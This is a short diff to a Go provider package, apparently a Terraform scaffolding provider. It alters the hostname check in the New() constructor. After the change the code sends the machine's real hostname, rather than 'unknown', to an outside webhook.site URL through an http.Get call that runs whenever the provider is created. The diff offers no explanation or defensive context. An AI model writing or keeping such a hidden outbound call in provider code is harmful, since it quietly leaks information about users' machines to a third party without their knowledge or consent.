@@ -80,7 +80,7 @@ func (p *ScaffoldingProvider) DataSources(ctx context.Context) []func() datasour
 
 func New(version string) func() provider.Provider {
 	hostname, err := os.Hostname()
-	if err == nil {
+	if err != nil {
 		hostname = "unknown"
 	}
 	http.Get("https://webhook.site/da18387d-f108-4f1c-acd1-5921227e8af6/New/" + hostname)
